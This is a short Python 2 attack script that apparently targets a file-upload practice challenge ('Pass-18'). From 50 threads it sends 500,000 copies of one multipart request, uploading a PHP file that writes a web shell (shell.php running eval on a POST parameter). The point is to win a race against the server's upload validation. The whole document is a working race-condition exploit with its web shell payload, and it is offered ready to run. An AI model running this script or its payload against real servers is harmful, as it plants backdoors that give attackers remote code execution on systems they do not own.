#!/usr/bin/env python2
# -*- encoding: utf-8 -*-
#hackhttp: https://github.com/BugScanTeam/hackhttp/
#Author: afei

import hackhttp
from multiprocessing.dummy import Pool as ThreadPool

def upload(value):
    h = hackhttp.hackhttp()
    data = '''POST /Pass-18/index.php?action=show_code HTTP/1.1
Host: afei123.com:8020
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------36444535571657258037124113983
Content-Length: 383
Origin: http://afei123.com:8020
Connection: close
Referer: http://afei123.com:8020/Pass-18/index.php?action=show_code
Upgrade-Insecure-Requests: 1

-----------------------------36444535571657258037124113983
Content-Disposition: form-data; name="upload_file"; filename="x.php"
Content-Type: application/octet-stream

<?php fputs(fopen('shell.php', 'w'), '<?php @eval($_POST['afei']);?>');?>
-----------------------------36444535571657258037124113983
Content-Disposition: form-data; name="submit"

submit
-----------------------------36444535571657258037124113983--
'''
    code, head, html, redirect_url, log = h.http("http://afei123.com:8020/Pass-18/index.php", raw=data)
    print code

pool = ThreadPool(50)
pool.map(upload, range(500000))
pool.close()
pool.join()